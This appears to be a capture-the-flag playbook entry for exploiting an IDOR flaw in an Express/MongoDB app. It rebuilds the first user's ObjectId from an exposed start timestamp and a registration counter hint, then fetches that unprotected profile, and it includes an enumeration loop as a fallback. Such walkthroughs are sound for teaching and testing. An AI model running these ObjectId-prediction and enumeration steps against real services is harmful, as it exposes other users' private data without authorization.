name: idor_mongodb_objectid_timestamp
category: web
tags: [idor, mongodb, objectid, timestamp, authorization, nodejs, express]
indicators:
  - "MongoDB ObjectId in URL path"
  - "No authorization check for profile access"
  - "First user has special data (flag)"
  - "App start timestamp exposed"
  - "User registration returns distance hint"
  - "/profile/:id endpoint"

tricks:
  - name: "Step 1: Identify IDOR vulnerability"
    when: "Found profile endpoint with user ID"
    how: "Check if authorization is validated"
    payload: |
      # server.js line 203-216:
      # get('/profile/:id', async (req, res) => {
      #     const user = await User.findById(req.params.id);
      #     if (!user) {
      #         return res.status(404).send('User not found');
      #     }
      #     ${user._id.toString() == firstUserId ? '<p>' + flag + '</p>' : '-'}
      # }
      #
      # Vulnerability:
      # - No authorization check - anyone can access any user's profile
      # - First user (user0) has flag in profile (line 214)
      # - Need to construct first user's MongoDB ObjectId

  - name: "Step 2: Get app start timestamp"
    when: "Need to construct first user's ObjectId"
    how: "Get timestamp from /starttime endpoint"
    payload: |
      GET /starttime
      # Returns: Unix timestamp (e.g., 1765683815)
      # This is when the first user was created
      #
      # Alternative: Get from /info endpoint
      GET /info
      # Shows: appStartTimestamp and ISO date

  - name: "Step 3: Register a user to get ObjectId structure"
    when: "Need ObjectId components"
    how: "Register new user to get distance hint and ObjectId"
    payload: |
      POST /register
      Content-Type: application/x-www-form-urlencoded
      username=testuser&password=testpass
      #
      # Response:
      # {
      #   "userId": "693e3270444a7e4c348813db",
      #   "userNumber": 2,
      #   "distance": 7,
      #   "maybehint": "You are 7 from your target user"
      # }
      #
      # distance = counter difference between new user and first user

  - name: "Step 4: Understand MongoDB ObjectId structure"
    when: "Have new user's ObjectId"
    how: "Parse ObjectId components"
    payload: |
      # MongoDB ObjectId structure (24 hex chars = 12 bytes):
      # Bytes 0-3 (chars 0-8): timestamp (4 bytes) - Unix timestamp in seconds
      # Bytes 4-6 (chars 8-14): machine identifier (3 bytes)
      # Bytes 7-8 (chars 14-18): process ID (2 bytes)
      # Bytes 9-11 (chars 18-24): counter (3 bytes) - increments for each ObjectId
      #
      # Example: 693e3270444a7e4c348813db
      # - Timestamp: 693e3270 (hex) = Unix timestamp
      # - Machine+PID: 444a7e4c34 (chars 8-18)
      # - Counter: 8813db (chars 18-24) = 8917979 (decimal)

  - name: "Step 5: Calculate first user's ObjectId"
    when: "Have new user ObjectId and distance"
    how: "Construct first user's ObjectId using timestamp and counter"
    payload: |
      # Extract components from new user's ObjectId:
      new_counter = int(new_user_id[18:24], 16)  # Last 6 hex chars
      first_counter = new_counter - distance
      #
      # Construct first user's ObjectId:
      timestamp_hex = format(start_timestamp, '08x')  # 8 hex chars
      machine_pid = new_user_id[8:18]  # machine + pid (same for all users)
      counter_hex = format(first_counter, '06x')  # 6 hex chars
      first_user_id = timestamp_hex + machine_pid + counter_hex
      #
      # Example:
      # start_timestamp = 1765683815
      # new_user_id = "693e3270444a7e4c348813db"
      # distance = 7
      # new_counter = 8917979
      # first_counter = 8917979 - 7 = 8917972
      # first_user_id = "693e3267444a7e4c348813d4"

  - name: "Step 6: Access first user's profile via IDOR"
    when: "First user ObjectId calculated"
    how: "Access /profile/:id with first user's ObjectId"
    payload: |
      GET /profile/{first_user_id}
      #
      # Response contains flag if user._id == firstUserId:
      # <h1>Welcome, user0</h1>
      # <p>FLAG{...}</p>
      #
      # No authentication required - IDOR vulnerability

  - name: "Alternative: Enumerate ObjectIds"
    when: "Calculation method fails"
    how: "Try ObjectIds with different counters"
    payload: |
      # If distance calculation is off, try nearby counters:
      for offset in range(-10, 10):
          test_counter = first_counter + offset
          test_id = timestamp_hex + machine_pid + format(test_counter, '06x')
          resp = requests.get(f"/profile/{test_id}")
          if "FLAG" in resp.text:
              flag = extract_flag(resp.text)
